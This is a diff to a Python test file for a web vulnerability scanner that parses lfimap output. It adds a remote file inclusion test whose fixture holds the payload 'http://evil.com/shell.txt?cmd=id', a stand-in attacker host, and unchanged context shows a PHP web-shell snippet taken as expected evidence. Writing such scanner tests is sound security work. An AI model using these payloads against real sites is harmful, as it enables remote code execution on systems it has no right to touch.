@@ -226,6 +226,25 @@ def test_parse_lfimap_output_parses_multiple_successful_attacks():
     assert "Injected data: <?php system($_GET['cmd']); ?>" in php_input["evidence"]
 
 
+def test_parse_lfimap_output_rfi():
+    stdout = """
+[*] Starting RFI Attack...
+[*] Testing rfi with command: http://evil.com/shell.txt?cmd=id
+[+] RFI successful! Injected code appears to be processed.
+"""
+    findings = apc._parse_lfimap_output("page", "GET", stdout)
+    assert len(findings) == 1
+    f = findings[0]
+    assert f["vulnerable"] is True
+    assert f["injection_type"] == "LFI"
+    assert f["payload_type"] == "LFI (RFI)"
+    assert f["parameter"] == "page"
+    assert f["payload"] == "http://evil.com/shell.txt?cmd=id"
+    assert f["attack_type"] == "RFI"
+    assert f["payload_source"] == "rfi"
+    assert "RFI successful!" in f["evidence"]
+
+
 def test_parse_lfimap_output_no_success_marker_returns_empty():
     stdout = """
 [*] Starting Data URI LFI Attack...
@@ -595,6 +614,16 @@ def test_generate_payload_recommendations_when_high_severity_present():
     recs = apc._generate_payload_recommendations("comprehensive", results)
     assert any('prioritize_high_severity' in r for r in recs)
     assert any('classify_xss_type_reflected_stored_dom' in r.lower() for r in recs)
+
+
+def test_advanced_payload_coordinator_sql_test_type_raises_value_error():
+    import pytest
+    with pytest.raises(ValueError, match="SQLi is not supported"):
+        apc.advanced_payload_coordinator("http://example.com", test_type="sql")
+    with pytest.raises(ValueError, match="SQLi is not supported"):
+        apc.advanced_payload_coordinator("http://example.com", test_type="sqli")
+    with pytest.raises(ValueError, match="SQLi is not supported"):
+        apc.advanced_payload_coordinator("http://example.com", test_type="some_sql_test")
 
 
 # -------------------------
